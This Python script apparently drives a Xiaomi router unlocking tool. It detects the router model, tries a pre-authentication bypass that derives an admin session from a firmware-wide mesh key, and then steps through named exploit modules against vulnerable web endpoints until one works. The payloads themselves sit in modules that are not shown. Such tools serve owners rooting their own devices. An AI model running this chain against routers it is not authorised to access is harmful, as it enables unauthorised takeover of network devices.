#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time

import xmir_base
from gateway import *


gw = Gateway(detect_device = False, detect_ssh = False)

if len(sys.argv) > 1:
    ip_addr = sys.argv[1]
    if not ip_addr:
        die("You entered an empty IP-address!")
    gw.ip_addr = ip_addr

gw.set_timeout(4)
gw.detect_device()
if gw.status < 1:
    die(f"Xiaomi Mi Wi-Fi device not found (IP: {gw.ip_addr})")

dn = gw.device_name

if gw.model_id > 0 and gw.model_id < gw.get_modelid_by_name('R2100'):
    import connect1  # c_upload/netspeed
    sys.exit(0)

#if dn in 'R2100 R2350 RM1800 RM2100 RA67':
#  import connect2
#  sys.exit(0)

#if dn == 'R3600' and gw.rom_version == '1.0.17':
#  import connect2
#  sys.exit(0)

#if dn == 'RA70' and gw.rom_version.startswith('3.'):
#  import connect4
#  sys.exit(0)

#if dn in 'R3600 RA69 RA70 RA72 RB03':
#  import connect3
#  sys.exit(0)

#if dn in 'RA80 RA82 RB01 RB03 RB06 RB08':
#  import connect4
#  sys.exit(0)

if True:
    # init gw and check ssh
    gw = create_gateway(timeout = 4, die_if_sshOk = True, die_if_ftpOk = True, web_login = False, try_telnet = True)

    # Pre-auth path: when no WEB password is known, mint an admin session from the
    # firmware-global mesh key instead of asking for one (see connect8). With a
    # saved password this is skipped and the normal login below is unchanged.
    if not gw.webpassword:
        try:
            import_module('connect8', gw)
        except ExploitNotWorked as e:
            print('WARN:', str(e))
    if not gw.stok:
        gw.web_login()

    hackCheck = gw.detect_hackCheck(update = True)
    if hackCheck:
        print(f'hackCheck version =', hackCheck)

    exp_modules = [
        'connect6',  # arn_switch/start_binding
        'connect5',  # smartcontroller
        'connect7',  # get_icon
        'connect9',  # cap_init -- the only vector that survives hackCheck v3
    ]
    for mod_name in exp_modules:
        try:
            import_module(mod_name, gw)
            break  # Ok
        except ExploitFixed as e:
            print('WARN:', str(e))
            continue  # try next module
        except ExploitNotWorked as e:
            print('WARN:', str(e))
            continue  # try next module
        except Exception:
            raise
